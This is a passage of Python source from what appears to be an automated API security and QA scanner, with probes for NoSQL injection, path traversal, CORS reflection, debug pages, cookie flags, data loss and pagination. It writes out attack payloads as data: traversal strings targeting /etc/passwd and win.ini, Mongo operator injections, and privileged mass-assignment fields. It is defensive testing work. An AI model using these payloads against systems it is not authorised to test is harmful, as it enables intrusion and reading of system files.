        more data than the benign value and a matched FALSE operator ({"$eq":
        <nomatch>}) — the filter was bypassed; OR the response carries a NoSQL
        error signature.
      • lead (P3): the operator object only triggers a generic 5xx (reaches the
        query engine but we can't prove a bypass — not confirmed, don't cry wolf).
    Candidate field names come from the body schema and from query params of the
    same path (apps like vfapi read a raw JSON body keyed like their GET filter).
    POST/PUT/PATCH only (never DELETE). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # path -> query-param names seen on ANY method (a raw-body POST often keys by them)
    path_qps: dict = {}
    for e in eps:
        p = str(e.get("path", ""))
        path_qps.setdefault(p, [])
        for qp in (e.get("query_params") or []):
            if qp not in path_qps[p]:
                path_qps[p].append(qp)

    _tok = {"v": None}

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"nosql_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        return _auth_headers(_tok["v"], auth)

    for e in [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")][:6]:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        keys = list(fields) + [k for k in path_qps.get(str(e.get("path", "")), []) if k not in fields]
        if not keys:
            continue
        others = _benign_body(fields)
        for key in keys[:3]:
            def send(value, _k=key, _h=headers, _p=path, _m=method):
                body = dict(others, **{_k: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            def ask(value):
                s, b = send(value)
                if s is None:
                    s, b = send(value)
                return s, b

            sb, bb = ask("qaxprobe1")
            if sb is None or sb >= 500:
                continue
            nben = len(bb or "")
            st, bt = ask({"$ne": "qax_nomatch_zzz"})
            sf, bf = ask({"$eq": "qax_nomatch_zzz"})
            where = f"body field '{key}'"
            if st == 200 and sf == 200 and bt is not None and bf is not None \
                    and len(bt) > max(len(bf), nben) * 2 + 20:
                out.append(ProbeFinding(
                    probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A query operator in {where} bypassed the filter: a TRUE operator "
                              f"returned far more data ({len(bt)}B) than a matched FALSE one ({len(bf)}B) "
                              f"or the benign value ({nben}B)."),
                    target=str(e.get("path", ""))))
            elif st is not None and st >= 500:
                if any(s in (bt or "").lower() for s in _NOSQL_ERRORS):
                    out.append(ProbeFinding(
                        probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P1",
                        evidence=(f"A query operator in {where} produced a NoSQL/driver error (benign → "
                                  f"{sb}, operator → {st}); the raw body reaches the document query."),
                        target=str(e.get("path", ""))))
                else:
                    out.append(ProbeFinding(
                        probe="nosql-lead",
                        title=f"Operator object rejected with 500 in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P3",
                        evidence=(f"A Mongo operator object in {where} caused HTTP {st} while a plain "
                                  f"string was accepted ({sb}) — the body may feed a document query "
                                  f"(possible NoSQL injection), NOT confirmed. Reported low and separately."),
                        target=str(e.get("path", ""))))
    return out


# Field names that must NEVER appear in a response body — a credential or secret
# in output is an exposure regardless of auth. Token-family names are deliberately
# excluded: a login returning an access_token is the expected, correct behaviour.
_SENSITIVE_OUT = ("password", "passwd", "pwd", "secret", "private_key", "privatekey",
                  "ssn", "social_security", "credit_card", "creditcard", "card_number",
                  "cardnumber", "cvv", "cvc", "salt", "password_hash", "pwd_hash")


def _sensitive_keys(data, found: set | None = None) -> set:
    """Recursively collect response keys that name a credential/secret with a value."""
    found = found if found is not None else set()
    if isinstance(data, dict):
        for k, v in data.items():
            kl = str(k).lower()
            if any(s in kl for s in _SENSITIVE_OUT) and v not in (None, "", [], {}):
                found.add(str(k))
            _sensitive_keys(v, found)
    elif isinstance(data, list):
        for item in data:
            _sensitive_keys(item, found)
    return found


def excessive_data_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None) -> list[ProbeFinding]:
    """
    Excessive Data Exposure: fetch each GET endpoint and inspect the LIVE response
    body (not the spec — nested secrets don't show as top-level fields) for keys
    that should never be returned. A credential in output, especially on an
    unauthenticated endpoint, is the finding. Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    gets = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
    token = None
    seen: set = set()
    for e in gets[:12]:
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "qaxprobe1", path)
        if resolved in seen:
            continue
        seen.add(resolved)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"ede_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            if not token:
                continue
            headers = _auth_headers(token, auth)
        try:
            r = sess.get(f"{base}{resolved}", headers=headers, timeout=15)
            if r.status_code >= 400:
                continue
            data = r.json()
        except Exception:
            continue
        hits = _sensitive_keys(data)
        if hits:
            public = not e.get("auth_required")
            out.append(ProbeFinding(
                probe="excessive-data",
                title=f"Excessive data exposure in GET {path}",
                exploited=True, severity="P1" if public else "P2",
                evidence=(f"The response exposes sensitive field(s) {sorted(hits)} "
                          + ("with NO authentication required" if public
                             else "to any authenticated user")
                          + f" (HTTP {r.status_code}). Credentials/secrets must never be returned."),
                target=path))
    return out


def cookie_flags_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Cookie hardening (QA knowledge base sec 1.3): a cookie set at login should carry
    HttpOnly (and Secure over HTTPS). Reads the raw Set-Cookie header(s) from the
    register/login responses. Bearer-token APIs (no cookies) no-op cleanly, so this
    only speaks when there is a real cookie to judge — low false positives. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    is_https = base.lower().startswith("https")

    ident = f"cookie_{uuid.uuid4().hex[:8]}@example.com"
    set_cookies: list[str] = []
    for path, body in ((recipe["register_path"], register_body(recipe, model, ident)),
                       (recipe["login_path"], None)):
        try:
            if body is not None:
                r = sess.post(f"{base}{path}", json=body, timeout=15)
            else:
                # Reuse the login identifier the register body used.
                lb = {recipe["id_field"]: ident, recipe["secret_field"]: "Secret123!"}
                r = sess.post(f"{base}{path}", json=lb, timeout=15)
        except Exception:
            continue
        # requests joins multiple Set-Cookie values; split defensively on ", <name>=".
        raw = r.headers.get("Set-Cookie") or ""
        if raw:
            set_cookies.append(raw)

    seen: set = set()
    for raw in set_cookies:
        for piece in re.split(r",(?=[^;=]+=)", raw):
            attrs = piece.strip().lower()
            name = piece.strip().split("=", 1)[0].strip()
            if not name or name in seen:
                continue
            seen.add(name)
            missing = []
            if "httponly" not in attrs:
                missing.append("HttpOnly")
            if is_https and "secure" not in attrs:
                missing.append("Secure")
            if missing:
                sev = "P2" if "HttpOnly" in missing else "P3"
                out.append(ProbeFinding(
                    probe="cookie-flags",
                    title=f"Cookie '{name}' is missing {', '.join(missing)}",
                    exploited=True, severity=sev,
                    evidence=(f"Login set cookie '{name}' without {', '.join(missing)}. "
                              + ("Without HttpOnly it is readable by JavaScript (XSS → session theft). "
                                 if "HttpOnly" in missing else "")
                              + ("Without Secure it can leak over plain HTTP. " if "Secure" in missing else "")),
                    target=recipe["login_path"]))
    return out


# Interactive debuggers (exposed = source disclosure AND often remote code execution).
_DEBUG_INTERACTIVE = ("werkzeug debugger", "__debugger__", "flask debugtoolbar",
                      "console.png?__debugger__", "werkzeug powered traceback interpreter")
# Stack-trace / internal-error disclosure (source paths, framework internals).
_DEBUG_TRACE = ("traceback (most recent call last)", "sqlalchemy.exc", "psycopg2.",
                "application trace", "exception value:", "request method:",
                'at object.<anonymous>', ".py&#34;, line ", '.py", line ', "stack trace:")


def debug_disclosure_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Debug-mode / stack-trace disclosure (QA knowledge base sec 1.9): a deployed app
    should never return an interactive debugger or a raw stack trace. Provokes an
    error with a malformed path value, then looks for HIGH-CONFIDENCE signatures
    only (a regex hit is a lead, not a finding — so weak matches are excluded).
    An exposed interactive debugger is P1 (often RCE); a bare stack trace is P2.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    lookups = [e for e in getattr(model, "endpoints", [])
               if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
               and "{" in str(e.get("path", ""))]
    seen: set = set()
    for e in lookups[:4]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        resolved = path.replace("{" + m.group(1) + "}", "qax%27%22bad")
        if resolved in seen:
            continue
        seen.add(resolved)
        try:
            r = sess.get(f"{base}{resolved}", timeout=15)
        except Exception:
            continue
        body = (r.text or "").lower()
        if any(s in body for s in _DEBUG_INTERACTIVE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Interactive debugger exposed on {e.get('method')} {path}",
                exploited=True, severity="P1",
                evidence=(f"An error on {path} returned an interactive debugger page (HTTP "
                          f"{r.status_code}). This leaks source and stack frames and its console "
                          f"can lead to remote code execution — debug mode must be off in a "
                          f"deployed app."),
                target=path))
        elif any(s in body for s in _DEBUG_TRACE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Stack trace / internal error disclosed on {e.get('method')} {path}",
                exploited=True, severity="P2",
                evidence=(f"An error on {path} returned a raw stack trace / framework internals "
                          f"(HTTP {r.status_code}), disclosing source paths and implementation "
                          f"detail that aid an attacker. Errors should be generic."),
                target=path))
    return out


def error_handling_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Robustness: an unknown route must return 404, not a 5xx (QA knowledge base sec
    1.8). A 500 on a path that CANNOT exist pollutes monitoring/alerting and makes
    real faults indistinguishable from scanner noise. Uses a guaranteed-nonexistent
    control path, so any 5xx is unambiguous — near-zero false positives. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    nonsense = f"/qax_nonexistent_{uuid.uuid4().hex[:12]}/does/not/exist"
    try:
        r = sess.get(f"{base}{nonsense}", timeout=15)
    except Exception:
        return out
    if r.status_code >= 500:
        out.append(ProbeFinding(
            probe="error-handling",
            title="Unknown routes return a server error (5xx) instead of 404",
            exploited=True, severity="P3",
            evidence=(f"GET {nonsense} — a path that cannot exist — returned HTTP {r.status_code}. "
                      f"Unknown routes should return 404; a 5xx pollutes monitoring and makes real "
                      f"faults and scans indistinguishable from crashes."),
            target=nonsense))
    return out


def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    # 100 chars: over bcrypt's 72-byte limit but within a typical 128 schema max,
    # so validation accepts it and the crash surfaces at the hashing step.
    big_password = "A" * 100
    try:
        r = sess.post(f"{base}{register}",
                      json=register_body(recipe, model, f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
                                         password=big_password),
                      timeout=15)
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="crash-fuzz", title="Server error (5xx) on oversized password",
                exploited=True, severity="P2",
                evidence=f"POST {register} with a {len(big_password)}-char password → HTTP "
                         f"{r.status_code} (valid per the schema's max length; exceeds the hashing "
                         f"library's 72-byte limit)",
                target=register))
    except Exception as exc:  # pragma: no cover - network
        logger.warning("crash_fuzz failed: %s", exc)
    return out


def security_headers_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Response-hardening headers (OWASP Secure Headers). One GET of the app root tells
    us whether the standard protections are set. Reports at most two consolidated
    findings — HSTS over HTTPS (P2) and the clickjacking/sniffing set (P3) — so this
    is a clear new angle without crying wolf. Deterministic, no auth, no model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    try:
        r = sess.get(base + "/", timeout=15)
    except Exception:
        return out
    h = {k.lower(): v for k, v in r.headers.items()}
    is_https = base.lower().startswith("https")
    csp = h.get("content-security-policy", "")

    # HSTS only means anything over HTTPS; flagging it on plain HTTP would be noise.
    if is_https and "strict-transport-security" not in h:
        out.append(ProbeFinding(
            probe="security-headers",
            title="Strict-Transport-Security (HSTS) header is not set",
            exploited=True, severity="P2",
            evidence=("The HTTPS app root returned no Strict-Transport-Security header, so a "
                      "browser can be downgraded to plain HTTP on the first/next visit "
                      "(SSL-strip → session theft)."),
            target="/"))

    missing = []
    if "x-content-type-options" not in h:
        missing.append("X-Content-Type-Options")              # MIME-sniffing
    if "x-frame-options" not in h and "frame-ancestors" not in csp.lower():
        missing.append("X-Frame-Options / CSP frame-ancestors")  # clickjacking
    if not csp:
        missing.append("Content-Security-Policy")             # XSS defence-in-depth
    if missing:
        out.append(ProbeFinding(
            probe="security-headers",
            title="Response security headers missing: " + ", ".join(missing),
            exploited=True, severity="P3",
            evidence=("The app root (HTTP %d) did not set: %s. These are defence-in-depth "
                      "against clickjacking, MIME-sniffing and XSS." % (r.status_code, ", ".join(missing))),
            target="/"))
    return out


# An origin an attacker would control — never one the app should trust. If it comes
# back reflected in Access-Control-Allow-Origin, CORS is echoing the caller's Origin.
_EVIL_ORIGIN = "https://qax-cors-probe.example"


def cors_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    CORS misconfiguration (OWASP). We send an attacker-controlled Origin; if the app
    reflects that exact origin back in Access-Control-Allow-Origin it trusts ANY site.
    Reflection + Allow-Credentials:true is P2 (a malicious page can read the victim's
    authenticated responses); reflection alone is P3. The proof is that the response
    echoes the origin we sent — self-controlling, near-zero false positives.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    try:
        r = sess.get(base + "/", headers={"Origin": _EVIL_ORIGIN}, timeout=15)
    except Exception:
        return out
    acao = (r.headers.get("Access-Control-Allow-Origin") or "").strip()
    acac = (r.headers.get("Access-Control-Allow-Credentials") or "").strip().lower()
    if acao == _EVIL_ORIGIN:
        creds = acac == "true"
        out.append(ProbeFinding(
            probe="cors",
            title="CORS reflects an arbitrary Origin" + (" with credentials" if creds else ""),
            exploited=True, severity="P2" if creds else "P3",
            evidence=("Request with Origin: %s was answered with Access-Control-Allow-Origin: %s%s. "
                      "The app trusts any site's origin, so a malicious page can make cross-origin "
                      "requests%s." % (_EVIL_ORIGIN, acao,
                                       " and Access-Control-Allow-Credentials: true" if creds else "",
                                       " and read the victim's authenticated responses" if creds
                                       else " to this API")),
            target="/"))
    return out


# Signatures that only appear if a file outside the web root was actually read back.
_TRAVERSAL_SIGS = (re.compile(r"root:.*:0:0:"),            # /etc/passwd
                   re.compile(r"\[extensions\]", re.I),    # Windows win.ini
                   re.compile(r"for 16-bit app support", re.I))
_TRAVERSAL_PAYLOADS = ("../../../../../../etc/passwd",
                       "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                       "....//....//....//....//etc/passwd",
                       "../../../../../../windows/win.ini")


def path_traversal_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None) -> list[ProbeFinding]:
    """
    Path traversal / local file inclusion (OWASP). For GET endpoints with a path
    parameter, substitute classic traversal payloads and confirm ONLY when the
    response body contains an unmistakable OS-file signature (e.g. /etc/passwd's
    `root:...:0:0:`). A benign value never contains it, so this is a proven P1 read
    of a file outside the web root — not a guess. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" in str(e.get("path", ""))]
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"trav_{uuid.uuid4().hex[:8]}@example.com", auth=auth)

    for e in cands[:5]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        hit = None
        for payload in _TRAVERSAL_PAYLOADS:
            url = f"{base}{path.replace('{' + param + '}', payload)}"
            try:
                r = sess.get(url, headers=headers, timeout=15)
            except Exception:
                continue
            if any(sig.search(r.text or "") for sig in _TRAVERSAL_SIGS):
                hit = (payload, r.status_code)
                break
        if hit:
            out.append(ProbeFinding(
                probe="path-traversal",
                title=f"Path traversal / local file read via path param '{param}' on {path}",
                exploited=True, severity="P1",
                evidence=(f"GET {path} with '{param}'='{hit[0]}' returned an OS file's contents "
                          f"(HTTP {hit[1]}; matched a /etc/passwd or win.ini signature). The "
                          f"parameter is used to build a filesystem path without sanitisation."),
                target=path))
    return out


# ──────────────────────────────────────────────────────────────────────────────
# QA-craft probes mined from the field manual (KB file 03 §3). These encode the
# bug classes a human QA lead caught by hand that pure HTTP/injection probes miss.
# ──────────────────────────────────────────────────────────────────────────────

# Create-body field names that the SERVER owns — never expect these to round-trip
# as we sent them, so a mismatch on one is not a data-loss bug.
_SERVER_OWNED = ("id", "uuid", "guid", "created", "updated", "modified", "_at",
                 "timestamp", "slug", "owner", "author", "user_id", "created_by",
                 "href", "url", "self", "etag", "version", "rev")


def _persistable_fields(fields: list[str]) -> list[str]:
    """String content fields whose value a create should store verbatim (round-trip)."""
    out = []
    for f in fields:
        lf = f.lower()
        if any(k in lf for k in _SECRET_KW):      # never echoed back — not data loss
            continue
        if any(k in lf for k in _SERVER_OWNED):    # server-assigned — mismatch expected
            continue
        out.append(f)
    return out


def persistence_probe(model, base_url: str, *, session: requests.Session | None = None,
                      auth: dict | None = None) -> list[ProbeFinding]:
    """
    Silent data loss on save — the highest-value class in the QA field manual (§3.A1,
    §3.B). The app returns 2xx "saved successfully", but a field set on create is blank
    when the record is read back (nested/dotted binding dropped it, an optional field
    failed to bind). The false success is what makes it dangerous.

    Method (the QA lead's "persistence hunt": set → save → RELOAD → read back), with a
    built-in control so we never cry wolf:
      1. POST a create body where each persistable string field carries its OWN unique
         marker token, and the key field a unique key.
      2. The create must return 2xx (control: the write was accepted).
      3. GET the object back by its key; it must return 2xx (control: it round-trips).
      4. A field is PRESENT if its marker appears anywhere in the read-back body.
         Report ONLY when at least one marker survived (proves read works and the
         object persisted) AND at least one did not (that specific field was dropped).
         All-present = safe; all-absent = inconclusive (GET may not echo fields) → silent.

    Writes disposable records only (unique keys, marker values). Never DELETEs.
    Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names, nest_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair a "read by key" GET with the POST that creates into the same collection.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET":
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "slug", "key", "id"))), None)
        if key_field and _persistable_fields([f for f in pf if f != key_field]):
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        return out

    token = None
    if any(p[0].get("auth_required") or p[1].get("auth_required") for p in pairs):
        token = _resolve_token(sess, base, recipe, model,
                               f"persist_{uuid.uuid4().hex[:8]}@example.com", auth=auth)

    for post, ge, prefix, param, key_field, pf in pairs[:4]:
        key = f"qaxkey{uuid.uuid4().hex[:10]}"
        markers: dict[str, str] = {}          # field -> its unique marker token
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty", "amount", "price")):
                body[f] = 1
            elif any(k in lf for k in ("is_", "enabled", "active", "admin", "approved")):
                body[f] = False
            elif any(k in lf for k in _DATE_KW):
                body[f] = "2020-01-01T00:00:00"
            elif any(k in lf for k in _SERVER_OWNED):
                body[f] = f"qax{uuid.uuid4().hex[:8]}"   # satisfy it, but don't track
            else:
                tok = f"qaxkeep{uuid.uuid4().hex[:10]}"
                markers[f] = tok
                body[f] = tok
        if not markers:
            continue
        headers = _auth_headers(token, auth) if (post.get("auth_required") or ge.get("auth_required")) else {}
        try:
            cr = sess.post(f"{base}{prefix}", json=nest_body(body), headers=headers, timeout=15)
        except Exception:
            continue
        if not (200 <= cr.status_code < 300):      # control: the create must be accepted
            continue
        _record_created(sess, prefix, body, headers)
        read_url = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
        try:
            rr = sess.get(read_url, headers=headers, timeout=15)
        except Exception:
            continue
        if not (200 <= rr.status_code < 300):      # control: the object must read back
            continue
        read_text = rr.text or ""
        present = [f for f, tok in markers.items() if tok in read_text]
        dropped = [f for f, tok in markers.items() if tok not in read_text]
        # Need a positive control (something survived) AND a real drop. All-absent is
        # inconclusive — the GET may just not echo these fields — so stay silent.
        if present and dropped:
            saved_msg = ""
            try:
                j = cr.json()
                if isinstance(j, dict) and (j.get("success") or "saved" in str(j).lower()):
                    saved_msg = " and reported success"
            except Exception:
                pass
            out.append(ProbeFinding(
                probe="persistence",
                title=f"Silent data loss on save in POST {prefix} (field(s) {dropped} not persisted)",
                exploited=True, severity="P2",
                evidence=(f"Created an object under {prefix} (HTTP {cr.status_code}{saved_msg}); on "
                          f"reading it back via {ge['path']} the field(s) {dropped} were blank while "
                          f"{present} persisted. A field accepted with a success response but silently "
                          f"dropped on reload is data loss the user never sees."),
                target=str(post.get("path", prefix))))
    return out


def auth_error_probe(model, base_url: str, *, session: requests.Session | None = None,
                     auth: dict | None = None) -> list[ProbeFinding]:
    """
    A forbidden request must return a clean 401/403, never a 5xx (QA field manual
    §3.F44: "500 where 403 belongs"). A crash in the auth layer leaks internals and
    pollutes monitoring. We call auth-required endpoints with a syntactically-invalid
    bearer token: a correct app answers 401/403 (and nothing is written, so write
    methods are safe); a 5xx is the finding. GET/POST/PUT/PATCH only (never DELETE).
    Control is self-evident — the token cannot authenticate anyone. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    bad = {"Authorization": "Bearer qax.invalid.token"}
    seen: set = set()
    for e in [x for x in getattr(model, "endpoints", []) if isinstance(x, dict)
              and x.get("auth_required")
              and str(x.get("method", "")).upper() in ("GET", "POST", "PUT", "PATCH")][:8]:
        method = str(e.get("method", "GET")).upper()
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "1", path)
        sig = (method, resolved)
        if sig in seen:
            continue
        seen.add(sig)
        try:
            if method == "GET":
                r = sess.get(f"{base}{resolved}", headers=bad, timeout=15)
            else:
                r = sess.request(method, f"{base}{resolved}", json={}, headers=bad, timeout=15)
        except Exception:
            continue
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="auth-error",
                title=f"Forbidden request returns a server error (5xx) on {method} {path}",
                exploited=True, severity="P2",
                evidence=(f"{method} {path} with an invalid bearer token returned HTTP "
                          f"{r.status_code} instead of a clean 401/403. An unauthorized request "
                          f"must be denied, not crash the server — a 5xx here leaks internals and "
                          f"hides real faults."),
                target=path))
    return out


# Characters the QA field manual (§3.F41) saw trigger a raw 405 from an unsanitised
# search-engine query syntax — a distinctive signature that plain injection fuzzing
# (which hunts 5xx + SQL errors) does not report.
_SEARCH_SPECIALS = ("@", '"', "(", ")", "/", "|", "~", "^", "-")
_SEARCH_KW = ("q", "query", "search", "term", "keyword", "filter", "name", "title", "text")


def search_robustness_probe(model, base_url: str, *, session: requests.Session | None = None,
                            auth: dict | None = None) -> list[ProbeFinding]:
    """
    Search/filter inputs should never return a raw 405/5xx on an ordinary character
    (QA field manual §3.F41: unsanitised query-operator syntax rejected a search for
    `@ " ( ) / | ~`, i.e. emails and slash terms). Control: a benign term must be
    accepted (<400); a special character that then yields 405 (or 5xx) is the lead.
    Reported P3 — a robustness defect, not an exploit — and GET-only (safe to repeat).
    Complements injection_probe, which hunts the 5xx+SQL-error case. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    token = None

    for e in [x for x in eps if str(x.get("method", "")).upper() == "GET" and x.get("query_params")][:8]:
        qps = list(e.get("query_params") or [])
        searchy = [q for q in qps if any(k == q.lower() or k in q.lower() for k in _SEARCH_KW)]
        if not searchy:
            continue
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"search_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            headers = _auth_headers(token, auth)

        def hit(value, _qp, _p=path, _h=headers, _all=qps):
            params = {p: "qaxprobe1" for p in _all}
            params[_qp] = value
            try:
                r = sess.get(f"{base}{_p}", params=params, headers=_h, timeout=15)
                return r.status_code
            except Exception:
                return None

        for qp in searchy[:2]:
            base_status = hit("qaxprobe1", qp)
            if base_status is None or base_status >= 400:
                continue                              # control must be accepted
            trigger = next((c for c in _SEARCH_SPECIALS
                            if (lambda s: s is not None and (s == 405 or s >= 500))(hit(c, qp))), None)
            if trigger is not None:
                status = hit(trigger, qp)
                out.append(ProbeFinding(
                    probe="search-robustness",
                    title=f"Search rejects an ordinary character with HTTP {status} on GET {e.get('path')}",
                    exploited=True, severity="P3",
                    evidence=(f"On GET {e.get('path')} a benign term in '{qp}' returned {base_status}, "
                              f"but the character '{trigger}' returned HTTP {status}. Real searches "
                              f"(emails, slash-separated terms) contain these characters; an unsanitised "
                              f"query syntax rejects them instead of escaping them."),
                    target=str(e.get("path", ""))))
    return out


_LIST_KEYS = ("items", "data", "results", "records", "rows", "list", "content", "entries")


def _extract_list(payload):
    """Pull the main array out of a list response (bare array or wrapped under a key)."""
    if isinstance(payload, list):
        return payload
    if isinstance(payload, dict):
        for k in _LIST_KEYS:
            if isinstance(payload.get(k), list):
                return payload[k]
    return None


def unpaginated_list_probe(model, base_url: str, *, session: requests.Session | None = None,
                           auth: dict | None = None) -> list[ProbeFinding]:
    """
    Large collections must paginate (QA field manual §3.D26: list pages returned
    1,700+ rows with no pager, bloating the DOM and the payload). Fetch each
    collection GET; if it returns a large array AND re-fetching with a limit param
    set to 1 returns the SAME large array (the limit is ignored), pagination is
    absent. The limit=1 re-fetch is the control: if it returns 1 row, pagination
    works and we stay silent — so this fires only on a proven unbounded list. P3,
    GET-only, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    THRESHOLD = 100
    token = None

    # Collection GETs: no path parameter (a listing, not a single record).
    cols = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
            and "{" not in str(e.get("path", ""))]
    seen: set = set()
    for e in cols[:8]:
        path = str(e.get("path", ""))
        if path in seen:
            continue
        seen.add(path)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"page_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            headers = _auth_headers(token, auth)
        try:
            r = sess.get(f"{base}{path}", headers=headers, timeout=15)
            if r.status_code >= 400:
                continue
            rows = _extract_list(r.json())
        except Exception:
            continue
        if rows is None or len(rows) < THRESHOLD:
            continue
        full = len(rows)
        # Control: ask for a single row via the common limit params. If honoured,
        # pagination works — stay silent.
        honoured = False
        for lp in ("limit", "per_page", "page_size", "pageSize", "size", "count", "top"):
            try:
                r2 = sess.get(f"{base}{path}", params={lp: 1}, headers=headers, timeout=15)
                rows2 = _extract_list(r2.json()) if r2.status_code < 400 else None
            except Exception:
                rows2 = None
            if rows2 is not None and len(rows2) <= max(1, full // 2):
                honoured = True
                break
        if honoured:
            continue
        out.append(ProbeFinding(
            probe="unpaginated-list",
            title=f"Collection GET {path} returns an unbounded, unpaginated list",
            exploited=True, severity="P3",
            evidence=(f"GET {path} returned {full} rows in one response and ignored a limit=1 "
                      f"request (still {full} rows). An unbounded list grows without limit as data "
                      f"accumulates — slow payloads, heavy DOM, and a denial-of-service lever."),
            target=path))
    return out


# Privileged fields a client should never be able to set at registration. If the
# created record echoes one back as granted, the server mass-assigned it.
_PRIV_FIELDS = {"admin": True, "is_admin": True, "isAdmin": True, "is_staff": True,
                "is_superuser": True, "role": "admin", "roles": ["admin"], "account_balance": 999999}


